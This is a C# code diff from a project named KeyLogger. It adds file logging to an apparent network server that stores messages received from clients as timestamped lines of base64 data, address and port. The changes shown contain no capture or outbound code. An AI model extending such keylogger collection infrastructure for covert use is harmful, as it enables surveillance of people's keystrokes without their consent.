@@ -8,6 +8,7 @@ using System.Collections.Generic;
 using System.Text;
 using System.Threading;
 using System.Diagnostics;
+using System.IO;
 
 namespace KeyLogger.Network
 {
@@ -202,8 +203,12 @@ namespace KeyLogger.Network
                 return; // No Client found
 
             nc.Disconnect("User request");
-            // TODO
-            // if file is open: CLOSE FILE
+
+            if (sw != null)
+            {
+                sw.Close();
+                sw = null;
+            }
         }
 
         public void Shutdown()
@@ -211,26 +216,25 @@ namespace KeyLogger.Network
             _nserver.Shutdown("User request");
         }
 
-        // TODO
-        // remove this when file writing is implemented
-        public List<string> Log = new List<string>();
+
 
         private DateTime lastEvent = DateTime.Now;
         private bool capturing = false;
-        private string currentFile; // TODO: is open file stream, not string
+        private FileStream currentFile;
+        private StreamWriter sw;
         public void StartCapture()
         {
             capturing = true;
             lastEvent = DateTime.Now;
-            Log = new List<string>();
-            // TODO
-            // create file: <ip>_<lastEvent[YYYY_mm_dd_HH_SS]>.log
+
+            currentFile = new FileStream("../../../Logs/"+DateTime.Now.ToString("yyyy_MM_dd_H_mm_ss")+".log", (FileMode)1);
+            sw = new StreamWriter(currentFile);
+
         }
         public void StopCapture()
         {
             capturing = false;
-            // TODO
-            // close file: <ip>_<lastEvent[YYYY_mm_dd_HH_SS]>.log
+            currentFile.Close();
         }
         private void LogMessage(double time, byte[] msg, IPEndPoint ip)
         {
@@ -246,7 +250,7 @@ namespace KeyLogger.Network
         }
 
         public static string sep = "|";
-        public static string lineSep = "\n";
+        public static char lineSep = '\n';
 
         private void DoLog(double totalMilliseconds, byte[] msg, long address, int port)
         {
@@ -255,10 +259,9 @@ namespace KeyLogger.Network
                 Convert.ToBase64String(msg) + sep +
                 address.ToString() + sep +
                 port.ToString();
-            Log.Add(entry);
-            // TODO
-            // add entry + lineSep to file stream
-            // flush file stram
+
+            sw.WriteLine(entry);
+            sw.Flush();
         }
     }
 }
